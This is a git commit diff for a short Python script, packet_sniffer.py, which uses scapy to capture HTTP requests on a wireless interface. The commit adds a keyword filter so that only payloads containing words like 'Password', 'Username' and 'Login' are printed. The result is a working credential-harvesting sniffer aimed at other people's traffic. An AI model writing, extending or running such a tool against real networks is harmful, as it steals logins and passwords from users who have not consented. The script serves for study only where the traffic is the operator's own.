fd117ad55c66d6fedfce2ef4490ea10ce053290b
admiral <amamadf@gmail.com>
2020-10-30 20:00:18 +0330

    added loop for not showing useless data

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -1,11 +1,20 @@
 import scapy.all as scapy
 from scapy.layers import http
+
+
 def sniff(interface):
-    scapy.sniff(iface="wlp58s0",store=False,prn=sniffed_packet)
+    scapy.sniff(iface=interface, store=False, prn=sniffed_packet)
+
 
 def sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
-         if packet.haslayer(scapy.Raw):
-            print(packet[scapy.Raw].load)
+        if packet.haslayer(scapy.Raw):
+            load = packet[scapy.Raw].load
+            keywords = ["Password", "Username", "pass", "user","Captcha","Login"]
+            for keyword in keywords:
+                if keyword.encode() in load:
+                    print(load)
+                    break
+
 
 sniff("wlp58s0")
